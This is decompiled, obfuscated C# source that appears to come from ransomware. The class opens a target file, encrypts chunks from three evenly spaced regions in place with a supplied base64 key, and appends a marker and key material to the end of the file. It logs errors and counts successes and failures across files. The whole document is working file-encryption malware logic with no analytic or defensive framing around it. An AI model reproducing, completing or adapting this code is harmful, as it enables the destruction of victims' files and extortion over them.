using System;
using System.IO;
using System.Text;
using QFSLrCXCNYPIKJ;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace azCTgkmpGT;

internal sealed class LjjjikaIyK
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int diMSApSDosOGqqr(long long_0)
	{
		return (int)long_0;
	}

	public static bool pPZVhaEwmPX(string zkfVxSNyPTSm, string jxOmLbwkfsw, string zqhPNDjGVJVoQ, byte[] bgSEaaLkzF = null, byte[] ngaosBBjJIQteVold = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(zkfVxSNyPTSm, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = diMSApSDosOGqqr(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(jxOmLbwkfsw) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(jxOmLbwkfsw) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(jxOmLbwkfsw) * 1024 * 1024) / 10;
				}
				int jOsxHiKYrOzj = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] byte_ = uIFWniPinkr(zkfVxSNyPTSm, fileStream, jOsxHiKYrOzj, num * i);
					array = (tEjVFvrPgtsm.OTLCmOpFsMP ? FRFdLnqaFph.BWvSzInVLSLIKib(byte_, Convert.FromBase64String(zqhPNDjGVJVoQ), ngaosBBjJIQteVold) : pNCPZOFhXOgiy.xjeqXDBiuVwBVy(byte_, Convert.FromBase64String(zqhPNDjGVJVoQ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					oQJuTHIuQwSXK(zkfVxSNyPTSm, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (tEjVFvrPgtsm.UpNccIaFzBadyA ? Encoding.ASCII.GetBytes(tEjVFvrPgtsm.OEjiexKEqeO(getString_0(107377954)) + tEjVFvrPgtsm.OEjiexKEqeO(getString_0(107378938)) + Convert.ToString(jxOmLbwkfsw) + tEjVFvrPgtsm.OEjiexKEqeO(getString_0(107378938))) : Encoding.ASCII.GetBytes(tEjVFvrPgtsm.OEjiexKEqeO(getString_0(107377954)) + tEjVFvrPgtsm.OEjiexKEqeO(getString_0(107378947)) + Convert.ToString(jxOmLbwkfsw) + tEjVFvrPgtsm.OEjiexKEqeO(getString_0(107378947))));
			if (!tEjVFvrPgtsm.UpNccIaFzBadyA)
			{
				using FileStream fileStream2 = new FileStream(zkfVxSNyPTSm, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(zkfVxSNyPTSm, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(bgSEaaLkzF, 0, bgSEaaLkzF.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (tEjVFvrPgtsm.SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(tEjVFvrPgtsm.bDDJFCkjBbYQ, getString_0(107398669) + zkfVxSNyPTSm + getString_0(107377909) + ex.Message + getString_0(107396555));
				}
				catch (Exception)
				{
				}
			}
			tEjVFvrPgtsm.ZzaknwGiCeEd++;
			return false;
		}
		tEjVFvrPgtsm.DPjjDEUnrYJ++;
		return true;
	}

	public static byte[] uIFWniPinkr(string wkKqUMTdQc, FileStream ZBXaxfoHhkkiHb, int JOsxHiKYrOzj, int kKKvypKbwFPjByG = 0)
	{
		byte[] array = new byte[JOsxHiKYrOzj];
		ZBXaxfoHhkkiHb.Position = kKKvypKbwFPjByG;
		ZBXaxfoHhkkiHb.Read(array, 0, JOsxHiKYrOzj);
		return array;
	}

	public static void oQJuTHIuQwSXK(string jdaNweLEmFuWRpTT, FileStream gLeoxZYvce, byte[] oRtxvFJyJhMAiTA, int WbgAiTGbYmNmvV = 0)
	{
		gLeoxZYvce.Position = WbgAiTGbYmNmvV;
		gLeoxZYvce.Write(oRtxvFJyJhMAiTA, 0, oRtxvFJyJhMAiTA.Length);
	}

	static LjjjikaIyK()
	{
		Strings.CreateGetStringDelegate(typeof(LjjjikaIyK));
	}
}
